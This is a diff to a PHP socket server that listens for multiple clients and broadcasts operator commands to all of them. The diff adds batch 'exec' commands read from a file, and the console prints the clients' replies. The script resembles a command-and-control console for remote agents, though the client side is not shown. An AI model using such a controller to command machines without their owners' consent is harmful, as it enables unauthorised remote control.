@@ -1,7 +1,9 @@
 #!/usr/local/bin/php -q
 <?php
+
 	set_time_limit(0);
 	ob_implicit_flush(1);
+
 	if($argc<3){
 		die("Assign host addr and port\n");
 	}
@@ -14,29 +16,41 @@
 	$host_addr 		= trim($argv[1]);
 	$host_port 		= trim($argv[2]);
 	$arg 			= (($argc-1) === 3) ? $argv[3] : '';
-	if (($master_sock = socket_create(AF_INET, SOCK_STREAM, SOL_TCP)) === false){
+
+	if (($master_sock = socket_create(AF_INET, SOCK_STREAM, SOL_TCP)) === false)	// create
+	{
 	    echo "\33[91m[!] socket_create() failed: reason: ".socket_strerror(socket_last_error())."\33[0m\n";
 	}
+
+
+	// TODO: more options
 	socket_set_option($master_sock, SOL_SOCKET, SO_REUSEADDR, 1);
-	if (socket_bind($master_sock, $host_addr, $host_port) === false){
+
+
+	if (socket_bind($master_sock, $host_addr, $host_port) === false)	// bind
+	{
 	    echo "\33[91m[!] socket_bind() failed: reason: ".socket_strerror(socket_last_error($master_sock))."\33[0m\n";
 	}
-	if (socket_listen($master_sock) === false){
+	if (socket_listen($master_sock) === false)	// listen
+	{
 	    echo "\33[91m[!] socket_listen() failed: reason: ".socket_strerror(socket_last_error($master_sock))."\33[0m\n";
 	}
 	
 	echo "\33[36mHost [".$host_addr.":".$host_port."] listening for incomming connections..\33[0m\n\n";
 	
-	$clients = array($master_sock);
-	$cstm = array();
-	
+	$clients 		 = array($master_sock);
+	$cstm 	 		 = array();
+	$previous_client = 0;
+	$current_client  = 0;
+	$cnt 			 = 0;
+
 	while (true) {
 	       
 	    // create a copy, so $clients doesn't get modified by socket_select()
 		$write = $recv = $clients;
-
 		$except = NULL;
 		$now = date('H:i:s');
+
 	    if(socket_select($recv, $write, $except, NULL) === false)
 	    {
 	    	die("\33[91m[!] socket_select() failed: reason: ".socket_strerror(socket_last_error($master_sock))."\33[0m\n");
@@ -47,10 +61,12 @@
 			{
 		        die("\33[91m[!] socket_accept() failed: reason: ".socket_strerror(socket_last_error($master_sock))."\33[0m\n");
 		    }
-			socket_getpeername($recv_sock, $ip, $port);
-		    echo "[".$now."] \33[32mClient connected on IP: [".$ip.":".$port."]\33[0m\n";
 
-		    $cstm [] =  array("ip" => $ip, "port" => $port);
+			socket_getpeername($recv_sock, $ip, $port);
+		    $cstm [] = array("ip" => $ip, "port" => $port);
+		    $current_client = $previous_client = $port;
+
+		    echo "[".$now."] \33[32mClient connected on IP: [".$ip.":".$port."]\33[0m\n";
 
 	        // remove the listening socket from the clients-with-data array
 	        $key = array_search($clients, $recv);
@@ -59,8 +75,6 @@
 	        continue;
 	    }
 
-	    $len = count($clients)-1;	// clients minus master socket
-	    $len2 = count($cstm);	// number of all clients (ip:port)
 
 	    foreach ($recv as $recv_sock)
 	    {
@@ -70,39 +84,82 @@
 	        if (($data = @socket_read($recv_sock, 4096, PHP_BINARY_READ)) === false || $data === "")
 	        {
 	            $key = array_search($recv_sock, $clients);
+	            $_key = array_search($port, array_map(function($v){return $v['port'];},$cstm));
 	            
 	            unset($clients[$key]);
 	            unset($recv[$key]);
 	            unset($write[$key]);
-				
-	            $_key = array_search($port, array_map(function($v){return $v['port'];},$cstm)); // u realnom svetu - IP umjesto porta
-	            unset($cstm[$_key]);
+	            unset($cstm[$_key]); 	// u realnom okruzenju - IP umjesto porta
 	            
+
 	            echo "[".$now."] \33[38;5;208mClient ".$ip.":".$port." disconnected.\33[0m\n";
 	            continue;
 	        }
  
           	$data = trim($data);
-
     
 	        if(!empty($data))
 		    	echo "Client [\33[95m".$ip.":".$port."\33[0m] :".$data."\n";
 
-		    if($len2 == $len)
-		    	$line = "";	// empty line when data is recieved from all clients
-		}
-	
+    	   	// $clients minus master socket
+	    	// $cstm = array of connected clients (ip:port)
+			// $line needs to be flushed => line=exec until data is recieved back
+			// empty $line when data is recieved from all clients
 
-    	if(@preg_match('/^(exec)\s\w+/', $line)){
-    		sleep(1);	// wait 1 sec until client/s send result
+		    if(count($cstm) == count($clients)-1)
+		    	$line = "";	
+		}
+
+		
+		// cnt > 1 => current client off => infinite loop
+    	if(@preg_match('/^(exec)\s\w+/', $line) && $cnt < 2)
+    	{
+    		echo ($cnt < 1) ? "Executing..\n" : "\33[91mExecute failed..\33[0m\n";
+    		$cnt++;
+    		sleep(1);	// wait 1 sec until client/s send callback
     		continue;
     	}
-    	else{
+    	else
+    	{
 			$line = readline(">>> ");
     		readline_add_history($line);
+    		$cnt = 0;
     	}
+	
+		// reading a file of commands
+		if(preg_match('/^exec\s[\-f]*\s[\.{0,2}\/]*\w*\.\w{2,3}$/', $line))
+		{
+			$file = substr($line, 8);
 
+			if(file_exists($file))
+			{
+				$fp = fopen($file, 'rb');
+				$cmdsarr = explode("\n", fread($fp, filesize($file)));
 
+				foreach ($cmdsarr as $cmd)
+				{
+					$cmd = trim("exec ".$cmd);
+					foreach ($write as $send_sock)
+			  		{
+				        if($send_sock == $master_sock)
+				            continue;
+
+				        else if(@socket_write($send_sock, $cmd."\n") === false)
+				        {	
+				        	echo "\33[91mWrite error: ".socket_strerror(socket_last_error($send_sock))."\33[0m\n";
+				        }	
+			    	}
+				}
+				continue;
+			}
+			else 
+			{
+				echo "Invalid path.\n";
+				continue;
+			}
+
+			print_r($cmdsarr);
+		}
 
 	    switch ($line) {
 	    	case 'clients':
@@ -122,23 +179,29 @@
 	    }
 
 
-
-	    if(!empty($line) && $line != 'clients' && $line != 'exit')
-	    {
-		  	foreach ($write as $send_sock) {
-		        if ($send_sock == $master_sock)
-		            continue;
-		        else if(@socket_write($send_sock, $line."\n") === false){	
-		        	echo "\33[91mWrite error: ".socket_strerror(socket_last_error($send_sock))."\33[0m\n";
-		        }	
-		    }
-		}
-		if(count($clients) === 1)
+		if(count($clients) === 1)	// only master socket = no clients
 		{
-			echo "\33[38;5;208mNo connected clients..\33[0m\nListening..\n"; 
+			echo "\33[38;5;208mNo connected clients..\33[0m\nListening..\n";
+			$line = "";
 		}
+		if(!empty($cstm) && !empty($write))
+		{
+		    if(!empty($line) && $line != 'clients' && $line != 'exit')
+		    {
+			  	foreach ($write as $send_sock)
+			  	{
+			        if($send_sock == $master_sock)
+			            continue;
 
+			        else if(@socket_write($send_sock, $line."\n") === false)
+			        {	
+			        	echo "\33[91mWrite error: ".socket_strerror(socket_last_error($send_sock))."\33[0m\n";
+			        }	
+			    }
+			}
+		}
 	}
+
 	echo "Closing master socket..\n";
 	socket_close($master_sock);
 	exit(0);
